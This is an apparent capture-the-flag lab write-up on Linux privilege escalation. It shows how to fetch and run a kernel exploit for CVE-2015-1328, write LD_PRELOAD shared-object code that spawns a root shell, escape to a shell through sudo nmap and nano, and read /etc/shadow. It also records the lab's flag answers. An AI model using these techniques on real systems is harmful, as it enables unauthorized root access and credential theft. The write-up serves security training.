# Linux Privilege Escalation

> Learn the fundamentals of Linux privilege escalation. From enumeration to exploitation, get hands-on with over 8 different privilege escalation techniques.

## Enumeration

```
hostname
uname -a
cat /etc/issue
python --version
```

![image](https://user-images.githubusercontent.com/90561566/195976275-e3fdd29f-8190-4f3b-8d1d-da5fc16514de.png)

![image](https://user-images.githubusercontent.com/90561566/195976293-3a425129-ca5c-4efa-b296-d4960ddf65b1.png)

```
searchsploit linux 3.13.0 Ubuntu 14.04
```

![image](https://user-images.githubusercontent.com/90561566/195976408-23a04384-0a58-480e-94db-a36695adaf17.png)

the answer is `CVE-2015-1328`

![image](https://user-images.githubusercontent.com/90561566/195976412-650b4a78-27d8-485e-81fe-41f56fa8be1a.png)

## Privilege Escalation: Kernel Exploits

download the exploit

```
searchsploit -m 37292.c
```

we can see it can't create or write file on target system, but we can move to /tmp directory to do it

```
cd /tmp
```

transfer the exploit to target system

```
ifconfig
python3 -m http.server
```

![image](https://user-images.githubusercontent.com/90561566/195976643-301ee84d-5619-4cc4-a20d-49551b7cc829.png)

on target system

```
wget 10.18.7.11:8000/37292.c
```

![image](https://user-images.githubusercontent.com/90561566/195976619-7a4c67e1-ca26-4608-8574-bde302dbe47c.png)

run the exploit

```
gcc 37292.c -o abc
id
./abc
id
```

![image](https://user-images.githubusercontent.com/90561566/195976781-2ebebda2-6f78-4f9e-b099-8d3af3f810c6.png)

![image](https://user-images.githubusercontent.com/90561566/195976815-9132a76e-9b9f-49a1-af85-9b8e252bf3f5.png)

| Flag | flag1.txt |
| --- | --- |
| Answer | THM-28392872729920 |

## Privilege Escalation: Sudo

Leverage application functions

Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.

In this case, we can use a "hack" to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (-f : specify an alternate ServerConfigFile).

![image](https://user-images.githubusercontent.com/90561566/195977500-5a22994c-c0b6-427e-99c2-03ebfc248f1e.png)

Loading the /etc/shadow file using this option will result in an error message that includes the first line of the /etc/shadow file.

Leverage LD_PRELOAD

On some systems, you may see the LD_PRELOAD environment option.

![image](https://user-images.githubusercontent.com/90561566/195977513-3727c8f3-9c9f-4bd9-a9e6-70145770c0bd.png)


The C code will simply spawn a root shell and can be written as follows;

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.

We need to run the program by specifying the LD_PRELOAD option, as follows

```
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

This will result in a shell spawn with root privileges.

![image](https://user-images.githubusercontent.com/90561566/195977557-95f47625-a7d2-49ce-a3dd-8baf241bcd88.png)

okay, comeback to this task is about sudo command

```
sudo -l
```

![image](https://user-images.githubusercontent.com/90561566/195977347-8acefc8a-1236-418b-950c-e8e50fbc5d25.png)

flag2 is easy to get with no restriction

![image](https://user-images.githubusercontent.com/90561566/195977474-1bcfcc3b-9df7-4c13-bc21-20295005f224.png)

| Flag | flag2.txt |
| --- | --- |
| Answer | THM-402028394 |

How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?

![image](https://user-images.githubusercontent.com/90561566/195977734-88cf1b40-8806-458e-b257-e332f793e710.png)

```
sudo nmap --interactive
```

the next task is see hash of frank's password

and you can use nano, less, find with sudo

![image](https://user-images.githubusercontent.com/90561566/195977934-8fbffaad-c79a-4a1c-bfc8-8ff58ef18e6e.png)

```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

or basically with less

```
sudo less /etc/shadow
```

![image](https://user-images.githubusercontent.com/90561566/195978060-52d86ab9-2b27-4a2a-b7b7-41a87d96e4a6.png)



















